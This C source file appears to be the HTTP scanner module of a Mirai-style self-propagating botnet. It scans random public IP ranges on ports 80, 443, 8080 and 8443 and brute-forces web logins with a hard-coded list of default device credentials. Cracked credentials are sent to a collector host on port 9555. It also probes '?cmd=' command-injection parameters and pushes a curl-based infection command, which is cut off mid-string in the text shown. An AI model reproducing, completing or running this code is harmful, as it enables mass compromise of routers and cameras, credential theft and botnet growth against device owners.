#ifdef SELFREP
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "includes.h"
#include "http_scanner.h"
#include "table.h"
#include "rand.h"
#include "util.h"
int http_scanner_pid = 0;
uint32_t http_fake_time = 0;
int http_ranges[] = {185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220};
uint16_t http_ports[] = {80, 443, 8080, 8443};
static struct http_cred_pair http_creds[] = {
    {"admin", "admin"},
    {"admin", ""},
    {"admin", "password"},
    {"admin", "1234"},
    {"admin", "12345"},
    {"root", "root"},
    {"root", "admin"},
    {"root", ""},
    {"user", "user"},
    {"guest", "guest"},
    {"support", "support"},
    {"default", "default"},
    {"ubnt", "ubnt"},
    {"hikvision", "hikvision"},
    {"dahua", "dahua"},
    {"toor", "root"},
    {"ftp", "ftp"},
    {"admin", "123456"},
    {"admin", "password123"},
    {"root", "123456"},
    {"admin", "admin123"},
    {"root", "pass"},
    {"admin", "pass"},
    {"root", "toor"},
    {"admin", "root"},
    {"service", "service"},
    {"supervisor", "supervisor"},
    {"tech", "tech"},
    {"manager", "manager"},
    {"Administrator", "admin"},
    {"admin", "Administrator"},
    {"root", "password"},
    {"admin", "passwd"},
    {"root", "passwd"},
    {"admin", "123"},
    {"root", "123"},
    {"admin", "1"},
    {"root", "1"},
    {"admin", "0"},
    {"root", "0"},
};
#define HTTP_CREDS_COUNT (sizeof(http_creds)/sizeof(http_creds[0]))
static void log_event(const char *scanner, const char *event, ipv4_t ip, uint16_t port, const char *details)
{
    FILE *f = fopen("logs.txt", "a");
    if(!f) return;
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);
    char time_str[64];
    strftime(time_str, sizeof(time_str), "%Y-%m-%d %H:%M:%S", tm);
    fprintf(f, "[%s] [%s] %s %d.%d.%d.%d:%d %s\n", 
            time_str, scanner, event,
            (ip>>24)&0xff, (ip>>16)&0xff, (ip>>8)&0xff, ip&0xff, 
            port, details ? details : "");
    fclose(f);
}
static void base64_encode(const char *input, char *output)
{
    const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    int in_len = strlen(input);
    int in_idx = 0;
    while(in_len--)
    {
        char_array_3[i++] = *(input + in_idx++);
        if(i == 3)
        {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for(i = 0; i < 4; i++)
                output[j++] = base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if(i)
    {
        for(int k = i; k < 3; k++)
            char_array_3[k] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for(int k = 0; k < i + 1; k++)
            output[j++] = base64_chars[char_array_4[k]];
        while(i++ < 3)
            output[j++] = '=';
    }
    output[j] = '\0';
}
static void http_report(ipv4_t addr, uint16_t port, const char *user, const char *pass)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    struct sockaddr_in cb;
    cb.sin_family = AF_INET;
    cb.sin_addr.s_addr = SCANIP;
    cb.sin_port = htons(9555);
    if (connect(fd, (struct sockaddr *)&cb, sizeof(cb)) == -1) {
        close(fd);
        return;
    }
    uint8_t zero = 0;
    uint16_t port_net = htons(port);
    send(fd, &zero, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, &addr, sizeof(ipv4_t), MSG_NOSIGNAL);
    send(fd, &port_net, sizeof(uint16_t), MSG_NOSIGNAL);
    uint8_t ulen = (uint8_t)strlen(user);
    uint8_t plen = (uint8_t)strlen(pass);
    if (ulen == 0) ulen = 1;
    if (plen == 0) plen = 1;
    send(fd, &ulen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, user, ulen, MSG_NOSIGNAL);
    send(fd, &plen, sizeof(uint8_t), MSG_NOSIGNAL);
    send(fd, pass, plen, MSG_NOSIGNAL);
    close(fd);
}
static ipv4_t get_random_http_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;
    do
    {
        tmp = rand_next();
        o1 = http_ranges[tmp % (sizeof(http_ranges)/sizeof(http_ranges[0]))];
        o2 = rand_next() & 0xff;
        o3 = rand_next() & 0xff;
        o4 = rand_next() & 0xff;
        tmp = INET_ADDR(o1, o2, o3, o4);
        if(o1 == 0 || o1 == 10 || o1 == 127 || (o1 == 172 && o2 >= 16 && o2 <= 31) || (o1 == 192 && o2 == 168) || o1 >= 224)
            continue;
    } while(tmp == LOCAL_ADDR || tmp == 0 || tmp == 0xffffffff);
    return tmp;
}
static int http_check_auth(int fd, const char *user, const char *pass)
{
    char auth_buf[256];
    char base64_buf[512];
    snprintf(auth_buf, sizeof(auth_buf), "%s:%s", user, pass);
    base64_encode(auth_buf, base64_buf);
    char req[1024];
    int req_len = snprintf(req, sizeof(req),
        "GET / HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "Authorization: Basic %s\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "\r\n",
        (LOCAL_ADDR>>24)&0xff, (LOCAL_ADDR>>16)&0xff, (LOCAL_ADDR>>8)&0xff, LOCAL_ADDR&0xff,
        base64_buf);
    send(fd, req, req_len, MSG_NOSIGNAL);
    char resp[2048];
    fd_set read_fds;
    FD_ZERO(&read_fds);
    FD_SET(fd, &read_fds);
    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    if(select(fd + 1, &read_fds, NULL, NULL, &tv) > 0)
    {
        if(FD_ISSET(fd, &read_fds))
        {
            int recv_len = recv(fd, resp, sizeof(resp) - 1, 0);
            if(recv_len > 0)
            {
                resp[recv_len] = 0;
                if(strstr(resp, "200 OK") != NULL || 
                   strstr(resp, "Location: /admin") != NULL ||
                   strstr(resp, "302 Found") != NULL)
                {
                    return 1;
                }
            }
        }
    }
    return 0;
}
static int http_check_command_injection(int fd, ipv4_t target_ip, uint16_t port)
{
    const char *infection_cmd = "curl -s https:
    const char *payloads[] = {
        "?cmd=id",
        "?exec=id",
        "?command=id",
        "?system=id",
        "?cmd=%s",
        "?exec=%s",
        "?command=%s",
    };
    char req[2048];
    char resp[2048];
    for(int i = 0; i < 4; i++)
    {
        int req_len = snprintf(req, sizeof(req),
            "GET %s HTTP/1.1\r\n"
            "Host: %d.%d.%d.%d\r\n"
            "User-Agent: Mozilla/5.0\r\n"
            "\r\n",
            payloads[i],
            (target_ip>>24)&0xff, (target_ip>>16)&0xff, (target_ip>>8)&0xff, target_ip&0xff);
        send(fd, req, req_len, MSG_NOSIGNAL);
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(fd, &read_fds);
        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        if(select(fd + 1, &read_fds, NULL, NULL, &tv) > 0)
        {
            if(FD_ISSET(fd, &read_fds))
            {
                int recv_len = recv(fd, resp, sizeof(resp) - 1, 0);
                if(recv_len > 0)
                {
                    resp[recv_len] = 0;
                    if(strstr(resp, "uid=") != NULL || 
                       strstr(resp, "gid=") != NULL ||
                       strstr(resp, "root:") != NULL)
                    {
                        return 1;
                    }
                }
            }
        }
        usleep(100000);
    }
    char cmd_payload[512];
    snprintf(cmd_payload, sizeof(cmd_payload), "?cmd=%s", infection_cmd);
    int req_len = snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %d.%d.%d.%d\r\n"
        "User-Agent: Mozilla/5.0\r\n"
        "\r\n",
        cmd_payload,
        (target_ip>>24)&0xff, (target_ip>>16)&0xff, (target_ip>>8)&0xff, target_ip&0xff);
    send(fd, req, req_len, MSG_NOSIGNAL);
    usleep(200000);
    return 0;
}
void http_scanner(void)
{
    http_scanner_pid = fork();
    if(http_scanner_pid > 0 || http_scanner_pid == -1)
        return;
    LOCAL_ADDR = util_local_addr();
    rand_init();
    while(TRUE)
    {
        ipv4_t target_ip = get_random_http_ip();
        uint16_t port = http_ports[rand_next() % (sizeof(http_ports)/sizeof(http_ports[0]))];
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if(fd < 0) continue;
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = target_ip;
        addr.sin_port = htons(port);
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
        if(connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
        {
            if(errno != EINPROGRESS)
            {
                close(fd);
                continue;
            }
        }
        fd_set write_fds;
        FD_ZERO(&write_fds);
        FD_SET(fd, &write_fds);
        struct timeval tv;
        tv.tv_sec = 3;
        tv.tv_usec = 0;
        if(select(fd + 1, NULL, &write_fds, NULL, &tv) <= 0)
        {
            close(fd);
            continue;
        }
        for(int i = 0; i < HTTP_CREDS_COUNT; i++)
        {
            if(http_check_auth(fd, http_creds[i].user, http_creds[i].pass))
            {
                log_event("HTTP", "Found creds", target_ip, port, http_creds[i].user);
                http_report(target_ip, port, http_creds[i].user, http_creds[i].pass);
                close(fd);
                goto next_target;
            }
            usleep(50000);
        }
        if(http_check_command_injection(fd, target_ip, port))
        {
            log_event("HTTP", "Command injection", target_ip, port, "vulnerable");
            http_report(target_ip, port, "admin", "admin");
        }
        close(fd);
        next_target:
        usleep(rand_next() % 500000 + 200000);
    }
    exit(0);
}
void http_kill(void)
{
    if(http_scanner_pid > 0)
    {
        kill(http_scanner_pid, 9);
        http_scanner_pid = 0;
    }
}
#endif
